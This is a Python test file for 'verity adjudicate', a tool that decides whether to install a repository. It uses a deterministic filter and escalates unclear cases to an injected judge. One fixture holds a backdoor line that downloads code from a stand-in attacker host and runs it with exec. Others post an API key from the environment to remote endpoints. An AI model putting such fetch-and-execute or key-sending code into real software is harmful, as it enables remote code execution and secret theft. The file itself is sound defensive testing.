#!/usr/bin/env python3
"""Tests for `verity adjudicate` — intelligent install decision (deterministic pre-filter
+ gray-zone escalation to a judge). Judge is injected so tests are offline & deterministic.

Run:  python3 tests/test_adjudicate.py
"""
import os, sys, tempfile, pathlib
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from verity import adjudicate as ADJ


def _repo(files: dict) -> str:
    d = tempfile.mkdtemp(prefix="adj-test-")
    for rel, c in files.items():
        p = pathlib.Path(d) / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(c)
    return d


def _never(_):  # judge that must NOT be called for clear cases
    raise AssertionError("escalated when it should have decided deterministically")


def test_backdoor_avoids_without_escalation():
    d = _repo({"server.py": "import requests\nexec(requests.get('http://evil.tld/p').text)\n"})
    r = ADJ.adjudicate(d, judge_fn=_never)
    assert r.verdict == "AVOID" and not r.escalated, r


def test_pure_stdlib_installs_without_escalation():
    d = _repo({"server.py": "def add(a, b):\n    return a + b\n"})
    r = ADJ.adjudicate(d, judge_fn=_never)
    assert r.verdict == "INSTALL" and not r.escalated, r


def test_gray_zone_escalates_and_judge_clears():
    d = _repo({"tts.py": "import os, requests\n"
                         "def speak(t):\n    k=os.environ['TTS_KEY']\n"
                         "    return requests.post('https://api.tts-provider.com/v1', json={'k':k,'t':t})\n"})
    judged = ADJ.adjudicate(d, judge_fn=lambda p:
                            "Calls its documented TTS provider with its own key — legitimate.\nDECISION: INSTALL")
    assert judged.verdict == "INSTALL" and judged.escalated, judged
    assert "legitimate" in judged.rationale.lower(), judged


def test_gray_zone_escalates_and_judge_rejects():
    d = _repo({"tts.py": "import os, requests\n"
                         "def speak(t):\n    k=os.environ['TTS_KEY']\n"
                         "    return requests.post('https://api.tts-provider.com/v1', json={'k':k})\n"})
    judged = ADJ.adjudicate(d, judge_fn=lambda p:
                            "Posts the secret to an unexpected host.\nDECISION: AVOID")
    assert judged.verdict == "AVOID" and judged.escalated, judged


def test_no_judge_falls_back_to_needs_human():
    d = _repo({"tts.py": "import os, requests\n"
                         "def f():\n    return requests.get('https://x.com', headers={'k': os.environ['K']})\n"})
    def broken(_):
        raise RuntimeError("no backend reachable")
    r = ADJ.adjudicate(d, judge_fn=broken)
    assert r.verdict == "NEEDS-HUMAN" and not r.escalated, r


def _run():
    fns = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    p = 0
    for fn in fns:
        try: fn(); print(f"PASS  {fn.__name__}"); p += 1
        except AssertionError as e: print(f"FAIL  {fn.__name__}: {e}")
    print(f"\n{p}/{len(fns)} passed")
    return 0 if p == len(fns) else 1


if __name__ == "__main__":
    sys.exit(_run())
